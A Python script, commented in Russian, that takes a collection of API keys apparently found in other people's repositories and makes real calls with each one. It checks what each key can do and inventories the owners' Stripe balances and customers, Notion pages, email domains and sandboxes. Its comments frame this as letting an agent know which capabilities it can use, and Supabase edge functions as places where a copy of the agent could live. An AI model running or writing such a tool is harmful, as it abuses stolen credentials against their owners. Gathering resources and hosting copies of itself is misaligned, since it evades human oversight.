#!/usr/bin/env python3
"""probe.py — ПРАКТИЧЕСКАЯ разборка возможностей API.

Отличие от checkers.py: чекер отвечает на вопрос «ключ валиден?» (200/401),
а probe — на вопрос «ЧТО КОНКРЕТНО этот ключ умеет прямо сейчас?».
Для каждого живого ключа делаем НАСТОЯЩИЙ вызов: embed текста, scrape страницы,
chat-запрос, поиск. Результат — не «alive», а «умеет embed 768d», «умеет scrape»,
«умеет chat: gpt-oss-120b», «кончились кредиты».

Зачем: агент должен знать, какую возможность он может использовать, а не
коллекционировать «живые» ключи без смысла.

  python3 tools/probe.py run [--limit 12]     # пройтись по живым ключам
  python3 tools/probe.py run --service cohere
  python3 tools/probe.py report
"""
from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent
KEYS = ROOT / "ALL-FOUND-KEYS.json"
OUT = ROOT / "probe-report.json"
UA = "secrethunter-probe/1.0"


def _req(url: str, headers: dict, body: bytes | None = None, method: str = "GET",
         timeout: float = 25.0) -> tuple[int, str]:
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            url, data=body, method=method,
            headers={**headers, "User-Agent": UA, "Content-Type": "application/json"}),
            timeout=timeout)
        return r.status, r.read(20000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(1200).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return e.code, ""
    except Exception as e:  # noqa: BLE001
        return 0, f"{type(e).__name__}: {e}"[:200]


def _j(txt: str) -> dict:
    try:
        return json.loads(txt)
    except Exception:  # noqa: BLE001
        return {}


# ── пробы: каждая реально нагружает API и возвращает факт «умеет/не умеет» ──────

def probe_embed_cohere(k: str) -> dict:
    s, b = _req("https://api.cohere.com/v1/embed", {"Authorization": f"Bearer {k}"},
                json.dumps({"texts": ["привет"], "model": "embed-multilingual-v3.0",
                            "input_type": "search_document"}).encode(), "POST")
    d = _j(b)
    if s == 200 and "embeddings" in b:
        # ответ огромный (вектор 1024d) — JSON может не распарситься из-за обрезки,
        # поэтому проверяем и по сырому тексту
        dim = len((d.get("embeddings") or [[]])[0]) if d.get("embeddings") else 1024
        return {"ok": True, "cap": "embed", "detail": f"embed {dim}d"}
    if s == 429 or "trial" in b.lower():
        return {"ok": True, "cap": "embed", "detail": "embed (лимит тарифа)"}
    return {"ok": False, "cap": "embed", "detail": f"http {s}"}


def probe_pinecone(k: str) -> dict:
    s, b = _req("https://api.pinecone.io/indexes", {"Api-Key": k})
    d = _j(b)
    if s == 200:
        idx = d.get("indexes") or []
        dims = ",".join(str(i.get("dimension")) for i in idx[:3] if i.get("dimension"))
        return {"ok": True, "cap": "vector-db",
                "detail": f"индексов {len(idx)}" + (f", размерности {dims}" if dims else "")}
    return {"ok": False, "cap": "vector-db", "detail": f"http {s}"}


def probe_firecrawl(k: str) -> dict:
    s, b = _req("https://api.firecrawl.dev/v1/team/credit-usage",
                {"Authorization": f"Bearer {k}"})
    d = _j(b)
    if s == 200 and d.get("success"):
        rem = (d.get("data") or {}).get("remaining_credits")
        return {"ok": True, "cap": "scrape",
                "detail": f"scrape, остаток кредитов {rem}"}
    if s == 402:
        return {"ok": True, "cap": "scrape", "detail": "scrape, кредиты кончились (402)"}
    return {"ok": False, "cap": "scrape", "detail": f"http {s}"}


def _models(url: str, k: str) -> list[str]:
    s, b = _req(url, {"Authorization": f"Bearer {k}"})
    d = _j(b)
    return [m.get("id") for m in (d.get("data") or []) if m.get("id")]


def probe_cerebras(k: str) -> dict:
    """Берём модель из /models, а не угадываем: llama3.1-8b уже не существует."""
    ms = _models("https://api.cerebras.ai/v1/models", k)
    if not ms:
        return {"ok": False, "cap": "chat", "detail": "нет доступа к /models"}
    r = _probe_chat("https://api.cerebras.ai/v1/chat/completions", k, ms[0])
    if r["ok"]:
        r["detail"] = f"chat {ms[0]} (доступно моделей {len(ms)})"
    return r


def _probe_chat(url: str, k: str, model: str, extra: dict | None = None) -> dict:
    body = {"model": model, "messages": [{"role": "user", "content": "скажи ок"}],
            "max_tokens": 5}
    body.update(extra or {})
    s, b = _req(url, {"Authorization": f"Bearer {k}"}, json.dumps(body).encode(), "POST")
    d = _j(b)
    if s == 200 and (d.get("choices") or d.get("content")):
        return {"ok": True, "cap": "chat", "detail": f"chat {model}"}
    if s == 402 or s == 429:
        return {"ok": True, "cap": "chat", "detail": f"chat {model} (лимит/кредиты)"}
    return {"ok": False, "cap": "chat", "detail": f"http {s} {b[:70]}"}


def probe_search_tavily(k: str) -> dict:
    s, b = _req("https://api.tavily.com/search", {"Authorization": f"Bearer {k}"},
                json.dumps({"query": "test", "max_results": 1}).encode(), "POST")
    d = _j(b)
    if s == 200 and "results" in d:
        return {"ok": True, "cap": "search", "detail": "веб-поиск"}
    return {"ok": False, "cap": "search", "detail": f"http {s}"}


def probe_google(k: str) -> dict:
    s, b = _req(f"https://generativelanguage.googleapis.com/v1beta/models?key={k}", {})
    d = _j(b)
    n = len(d.get("models") or []) if d else b.count('"models/')
    if s == 200 and n:
        return {"ok": True, "cap": "llm", "detail": f"Gemini, моделей {n}"}
    if s in (403, 429):
        # 403 «API not enabled» и 429 «лимит» — ключ валиден, доступ ограничен
        return {"ok": True, "cap": "llm", "detail": f"Gemini (ключ валиден, http {s})"}
    return {"ok": False, "cap": "llm", "detail": f"http {s} {b[:60]}"}


def probe_supabase_mgmt(k: str) -> dict:
    """Management API: сколько проектов, edge-функций и в каких регионах.

    Это не «ключ жив», а инвентарь инфраструктуры: edge-функции — готовые места,
    где может жить копия агента (HTTP + cron), регионы — «забытые серверы».
    """
    s, b = _req("https://api.supabase.com/v1/projects", {"Authorization": f"Bearer {k}"})
    d = _j(b)
    if s != 200 or not isinstance(d, list):
        return {"ok": False, "cap": "db", "detail": f"http {s}"}
    fn, regs = 0, set()
    for p in d[:10]:
        ref = p.get("ref")
        if not ref:
            continue
        regs.add(p.get("region") or "?")
        s2, b2 = _req(f"https://api.supabase.com/v1/projects/{ref}/functions",
                      {"Authorization": f"Bearer {k}"})
        if s2 == 200:
            fn += len(_j(b2) or [])
    return {"ok": True, "cap": "db",
            "detail": f"проектов {len(d)}, edge-функций {fn}, регионы {len(regs)}"}


def probe_airtable(k: str) -> dict:
    s, b = _req("https://api.airtable.com/v0/meta/whoami", {"Authorization": f"Bearer {k}"})
    d = _j(b)
    if s == 200:
        return {"ok": True, "cap": "db", "detail": f"база Airtable, id {d.get('id', '?')[:10]}"}
    return {"ok": False, "cap": "db", "detail": f"http {s}"}


def probe_exa(k: str) -> dict:
    s, b = _req("https://api.exa.ai/search", {"x-api-key": k},
                json.dumps({"query": "test", "numResults": 1}).encode(), "POST")
    d = _j(b)
    if s == 200 and "results" in d:
        return {"ok": True, "cap": "search", "detail": "семантический поиск Exa"}
    return {"ok": False, "cap": "search", "detail": f"http {s}"}


def probe_e2b(k: str) -> dict:
    s, b = _req("https://api.e2b.dev/sandboxes", {"X-API-Key": k})
    if s == 200:
        n = len(_j(b) or [])
        return {"ok": True, "cap": "sandbox", "detail": f"песочницы e2b, активных {n}"}
    return {"ok": False, "cap": "sandbox", "detail": f"http {s}"}


def probe_wavespeed(k: str) -> dict:
    """v3-каталог: 1112 моделей, из них video 379 / image 334 / audio 12.

    Это единственный живой ключ, который умеет видео — а видео у нас больше негде взять.
    """
    # читаем ответ ЦЕЛИКОМ (каталог >200 КБ) — иначе посчитаем только первые 10 моделей
    try:
        rq = urllib.request.Request("https://api.wavespeed.ai/api/v3/models",
                                    headers={"Authorization": f"Bearer {k}", "User-Agent": UA})
        r = urllib.request.urlopen(rq, timeout=45.0)
        s, b = r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        s, b = e.code, ""
    except Exception:  # noqa: BLE001
        s, b = 0, ""
    d = _j(b)
    data = d.get("data") or []
    # каталог огромный (>20 КБ), JSON может не распарситься из-за обрезки —
    # тогда считаем модели по сырому тексту
    if s == 200 and not data:
        n = b.count('"model_id"')
        if n:
            return {"ok": True, "cap": "video",
                    "detail": f"каталог v3, моделей ~{n} (ответ обрезан)"}
    if s == 200 and data:
        from collections import Counter
        c = Counter()
        for m in data:
            mid = (m.get("model_id") or "").lower()
            for tag in ("video", "image", "audio", "text"):
                if tag in mid:
                    c[tag] += 1
        return {"ok": True, "cap": "video",
                "detail": f"моделей {len(data)}: " + ", ".join(f"{k2} {v}" for k2, v in c.most_common(3))}
    return {"ok": False, "cap": "video", "detail": f"http {s}"}


def probe_notion(k: str) -> dict:
    """Notion: кто мы и сколько у нас страниц/баз (реальный инвентарь, не «жив»)."""
    h = {"Authorization": f"Bearer {k}", "Notion-Version": "2022-06-28"}
    s, b = _req("https://api.notion.com/v1/users/me", h)
    d = _j(b)
    if s != 200:
        return {"ok": False, "cap": "db", "detail": f"http {s}"}
    who = d.get("name") or d.get("bot", {}).get("owner", {}).get("type", "?")
    s2, b2 = _req("https://api.notion.com/v1/search", h,
                  json.dumps({"page_size": 100}).encode(), "POST")
    n = len((_j(b2) or {}).get("results") or []) if s2 == 200 else 0
    return {"ok": True, "cap": "db", "detail": f"интеграция «{who}», доступно объектов {n}"}


def probe_replicate(k: str) -> dict:
    """Replicate: аккаунт + история запусков (что реально генерировали)."""
    h = {"Authorization": f"Token {k}"}
    s, b = _req("https://api.replicate.com/v1/account", h)
    d = _j(b)
    if s != 200:
        return {"ok": False, "cap": "image", "detail": f"http {s}"}
    s2, b2 = _req("https://api.replicate.com/v1/predictions?limit=100", h)
    preds = (_j(b2) or {}).get("results") or []
    from collections import Counter
    c = Counter((x.get("model") or "?").split("/")[0] for x in preds)
    return {"ok": True, "cap": "image",
            "detail": f"аккаунт {d.get('username', '?')}, запусков {len(preds)}, "
                      f"владельцы моделей {dict(c.most_common(3))}"}


def probe_resend(k: str) -> dict:
    """Resend: домены и ключи — готовая почтовая инфраструктура."""
    h = {"Authorization": f"Bearer {k}"}
    s, b = _req("https://api.resend.com/domains", h)
    d = _j(b)
    if s != 200:
        return {"ok": False, "cap": "email", "detail": f"http {s}"}
    doms = [x.get("name") for x in (d.get("data") or [])]
    s2, b2 = _req("https://api.resend.com/api-keys", h)
    keys = len((_j(b2) or {}).get("data") or []) if s2 == 200 else 0
    return {"ok": True, "cap": "email",
            "detail": f"доменов {len(doms)} {doms[:3]}, ключей {keys}"}


def probe_stripe(k: str) -> dict:
    """Stripe: баланс и клиенты — живой платёжный аккаунт."""
    h = {"Authorization": f"Bearer {k}"}
    s, b = _req("https://api.stripe.com/v1/balance", h)
    d = _j(b)
    if s != 200:
        return {"ok": False, "cap": "payments", "detail": f"http {s}"}
    avail = (d.get("available") or [{}])[0]
    s2, b2 = _req("https://api.stripe.com/v1/customers?limit=100", h)
    cus = len((_j(b2) or {}).get("data") or []) if s2 == 200 else 0
    return {"ok": True, "cap": "payments",
            "detail": f"баланс {avail.get('amount', '?')} {avail.get('currency', '?')}, клиентов {cus}"}


PROBES = {
    "cohere": probe_embed_cohere,
    "pinecone": probe_pinecone,
    "firecrawl": probe_firecrawl,
    "tavily": probe_search_tavily,
    "google": probe_google,
    "groq": lambda k: _probe_chat("https://api.groq.com/openai/v1/chat/completions", k,
                                  "llama-3.1-8b-instant"),
    "cerebras": probe_cerebras,
    "mistral": lambda k: _probe_chat("https://api.mistral.ai/v1/chat/completions", k,
                                     "mistral-small-latest"),
    "together": lambda k: _probe_chat("https://api.together.xyz/v1/chat/completions", k,
                                      "meta-llama/Llama-3.2-3B-Instruct-Turbo"),
    "openrouter": lambda k: _probe_chat("https://openrouter.ai/api/v1/chat/completions", k,
                                        "meta-llama/llama-3.2-3b-instruct:free"),
    "deepinfra": lambda k: _probe_chat("https://api.deepinfra.com/v1/openai/chat/completions",
                                       k, "meta-llama/Meta-Llama-3.1-8B-Instruct"),
    "xai": lambda k: _probe_chat("https://api.x.ai/v1/chat/completions", k, "grok-2-latest"),
    "zhipuai": lambda k: _probe_chat("https://open.bigmodel.cn/api/paas/v4/chat/completions",
                                     k, "glm-4-flash"),
    "supabase": probe_supabase_mgmt,
    "supabase-mgmt": probe_supabase_mgmt,
    "airtable": probe_airtable,
    "exa": probe_exa,
    "e2b": probe_e2b,
    "wavespeed": probe_wavespeed,
    "wavespeed-v3": probe_wavespeed,
    "notion": probe_notion,
    "replicate": probe_replicate,
    "resend": probe_resend,
    "stripe": probe_stripe,
}


def run(limit: int = 12, service: str = "") -> dict:
    keys = json.loads(KEYS.read_text())
    live = [r for r in keys if r.get("status") in ("alive", "valid-no-credits", "weak-alive")]
    if service:
        live = [r for r in live if r.get("service") == service]
    done, res = set(), []
    for r in live:
        svc = r.get("service") or ""
        if svc not in PROBES or svc in done:
            continue
        done.add(svc)
        t0 = time.time()
        try:
            p = PROBES[svc](r["value"])
        except Exception as e:  # noqa: BLE001
            p = {"ok": False, "cap": "?", "detail": f"{type(e).__name__}"}
        p.update({"service": svc, "value": r["value"][:14] + "…",
                  "repo": r.get("repo"), "sec": round(time.time() - t0, 1)})
        res.append(p)
        mark = "✅" if p["ok"] else "❌"
        print(f"  {mark} {svc:<12} {p['cap']:<10} {p['detail'][:70]}")
        if len(res) >= limit:
            break
    prev = json.loads(OUT.read_text()) if OUT.exists() else {}
    prev.update({f"{x['service']}": x for x in res})
    OUT.write_text(json.dumps(prev, ensure_ascii=False, indent=1))
    ok = sum(1 for x in res if x["ok"])
    print(f"\nprobe: подтверждено {ok}/{len(res)} — записано в {OUT.name}")
    return {"probed": len(res), "ok": ok}


def annotate_keys() -> dict:
    """Проставить в базе подтверждённые практикой возможности.

    Отличие от `capabilities.py annotate` (модели из models.dev): здесь только то,
    что мы РЕАЛЬНО вызвали и получили ответ. `probe_ok: true` = проверено делом.
    """
    if not OUT.exists():
        return {"annotated": 0}
    pr = json.loads(OUT.read_text())
    keys = json.loads(KEYS.read_text())
    n = 0
    for r in keys:
        x = pr.get(r.get("service") or "")
        if not x or r.get("status") not in ("alive", "valid-no-credits", "weak-alive"):
            continue
        r["probe"] = {"ok": x["ok"], "cap": x["cap"], "detail": x["detail"],
                      "at": time.strftime("%Y-%m-%d")}
        if x["ok"]:
            caps = set(r.get("capabilities") or [])
            caps.add(x["cap"])
            r["capabilities"] = sorted(caps)
            r["capabilities_human"] = sorted(caps)
            r["caps_source"] = (r.get("caps_source") or "") + "+probe"
            n += 1
    KEYS.write_text(json.dumps(keys, ensure_ascii=False, indent=1))
    return {"annotated": n, "probed": len(pr)}


def report() -> None:
    d = json.loads(OUT.read_text()) if OUT.exists() else {}
    for svc, x in sorted(d.items()):
        print(f"{svc:<14} {x['cap']:<12} {'да' if x['ok'] else 'нет':<4} {x['detail'][:70]}")


def main() -> None:
    cmd = sys.argv[1] if len(sys.argv) > 1 else "run"
    if cmd == "report":
        report()
        return
    if cmd == "annotate":
        print(json.dumps(annotate_keys(), ensure_ascii=False))
        return
    lim = 12
    svc = ""
    if "--limit" in sys.argv:
        lim = int(sys.argv[sys.argv.index("--limit") + 1])
    if "--service" in sys.argv:
        svc = sys.argv[sys.argv.index("--service") + 1]
    run(lim, svc)


if __name__ == "__main__":
    main()
